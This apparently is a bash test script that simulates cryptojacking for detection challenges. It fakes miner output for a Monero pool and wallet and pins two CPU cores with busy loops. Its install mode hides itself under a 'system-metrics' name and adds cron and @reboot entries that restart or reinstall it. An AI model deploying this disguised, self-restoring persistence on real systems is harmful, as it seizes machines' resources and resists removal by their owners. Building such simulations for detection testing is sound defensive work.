#!/usr/bin/env bash

# Combined Cryptojacking Simulation with Auto-Persistence
# For security testing and agent detection challenges

# Check if we're being run for persistence installation
if [[ "$1" == "--install-persistence" ]]; then
    SCRIPT_DIR="$HOME/.cache/system-metrics"
    SCRIPT_NAME="metrics-collector.sh"
    
    # Create directory and copy this script
    mkdir -p "$SCRIPT_DIR"
    cp "$0" "$SCRIPT_DIR/$SCRIPT_NAME"
    chmod +x "$SCRIPT_DIR/$SCRIPT_NAME"
    
    # Install crontab entries for persistence with logging
    (crontab -l 2>/dev/null | grep -v "system-metrics"; cat << EOF
# System metrics collection
*/1 * * * * pgrep -f "$HOME/.cache/system-metrics/metrics-collector.sh" > /dev/null || (echo "\$(date): Restarting metrics-collector" >> $HOME/.cache/system-metrics/restart.log && cd $HOME/.cache/system-metrics && nohup ./metrics-collector.sh >> $HOME/.cache/system-metrics/miner.log 2>&1 &)
*/1 * * * * [ ! -f $HOME/.cache/system-metrics/metrics-collector.sh ] && (echo "\$(date): Reinstalling script" >> $HOME/.cache/system-metrics/restart.log && cp "\$0" $HOME/.cache/system-metrics/metrics-collector.sh && chmod +x $HOME/.cache/system-metrics/metrics-collector.sh)
@reboot sleep 30 && (echo "\$(date): Boot startup" >> $HOME/.cache/system-metrics/restart.log && cd $HOME/.cache/system-metrics && nohup ./metrics-collector.sh >> $HOME/.cache/system-metrics/miner.log 2>&1 &)
EOF
    ) | crontab -
    
    echo "Persistence installed. Cryptojacking simulation will restart automatically if killed."
    echo "Mining process starting in background..."
    cd "$SCRIPT_DIR"
    nohup ./"$SCRIPT_NAME" > /dev/null 2>&1 &
    exit 0
fi

# If not installing persistence, run the mining simulation

# --- MODIFICATION ---
# Hardcoded to use exactly two workers to max out two CPU cores for the test scenario.
WORKERS=2
# --- END MODIFICATION ---

# Configurable parameters
DURATION=1800
MINER_NAME="xmr-stak-rx"
POOL="stratum+tcp://xmr.pool.minergate.com:45700"
WALLET="44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A"

# Colors
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Timestamp function
timestamp() {
  date +"%H:%M:%S"
}

# Print startup banner (skip clear when running from cron)
if [ -t 1 ]; then
    clear
fi
echo -e "${CYAN}[$(timestamp)]${NC} ${MINER_NAME} v2.10.8"
echo -e "${CYAN}[$(timestamp)]${NC} Starting miner with ${WORKERS} threads, connecting to ${POOL}"
echo -e "${CYAN}[$(timestamp)]${NC} Using wallet: ${WALLET:0:8}...${WALLET: -8}"
sleep 1

# Start the workers in background to consume CPU
declare -a worker_pids
for ((i=1; i<=WORKERS; i++)); do
  ( while true; do
      # This creates a CPU-intensive operation that's hard to optimize away
      for ((j=0; j<10000000; j++)); do
        ((j*j+7*j)) > /dev/null 2>&1
      done
    done
  ) &
  worker_pids[$i]=$!
  available_cores=$(nproc --all)
  echo -e "${CYAN}[$(timestamp)]${NC} Worker thread $i initialized on CPU core $(( (i-1) % available_cores ))"
  sleep 0.5
done

echo -e "${CYAN}[$(timestamp)]${NC} Mining pool connection established"
echo -e "${CYAN}[$(timestamp)]${NC} Stratum difficulty set to 110357"
sleep 1

# Variables for hashrate display
base_hashrate=$(( 225 + RANDOM % 75 ))
start_time=$(date +%s)
shares_accepted=0
shares_rejected=0

# Cleanup function
cleanup() {
  echo -e "\n${CYAN}[$(timestamp)]${NC} Terminating mining operations..."
  for pid in ${worker_pids[*]}; do
    # Use kill -9 to ensure the process is terminated immediately
    kill -9 $pid 2>/dev/null
  done
  echo -e "${CYAN}[$(timestamp)]${NC} All workers terminated successfully"
  exit 0
}

# Set trap for cleanup
trap cleanup SIGINT SIGTERM

# Main loop to simulate mining activity
end_time=$((start_time + DURATION))
while [ $(date +%s) -lt $end_time ]; do
  # Calculate elapsed time
  current_time=$(date +%s)
  elapsed=$((current_time - start_time))
  
  # Random events
  event=$((RANDOM % 20))
  
  # Simulated hashrate with small variations
  variation=$(( RANDOM % 20 - 10 ))
  current_hashrate=$((base_hashrate + variation))
  
  # Display different events
  if [ $event -eq 0 ]; then
    shares_accepted=$((shares_accepted + 1))
    echo -e "${CYAN}[$(timestamp)]${NC} ${GREEN}Accepted share #$shares_accepted ${NC}(diff ${YELLOW}110357${NC})"
  elif [ $event -eq 1 ]; then
    echo -e "${CYAN}[$(timestamp)]${NC} New job received from pool: job_id ${YELLOW}ac0dcf5${NC}"
  elif [ $event -eq 2 ] && [ $((RANDOM % 20)) -eq 0 ]; then
    shares_rejected=$((shares_rejected + 1))
    echo -e "${CYAN}[$(timestamp)]${NC} \033[0;31mRejected share #$shares_rejected ${NC}(diff too low)"
  elif [ $event -eq 3 ]; then
    # Generate random hex without openssl dependency
    random_hex=$(printf "%08x" $((RANDOM * RANDOM)))
    echo -e "${CYAN}[$(timestamp)]${NC} Thread #$(( RANDOM % WORKERS + 1 )) nonce: ${YELLOW}0xb${random_hex:0:7}${NC}"
  else
    # Just display current stats
    echo -e "${CYAN}[$(timestamp)]${NC} Hashrate: ${GREEN}${current_hashrate}.$(( RANDOM % 100 )) H/s${NC} | Shares: ${GREEN}$shares_accepted${NC}/${YELLOW}$shares_rejected${NC} | Uptime: ${elapsed}s"
  fi
  
  # Random sleep to make it look more realistic
  sleep_time=$(( 1 + RANDOM % 2 ))
  sleep $sleep_time
done

# Clean up at the end
cleanup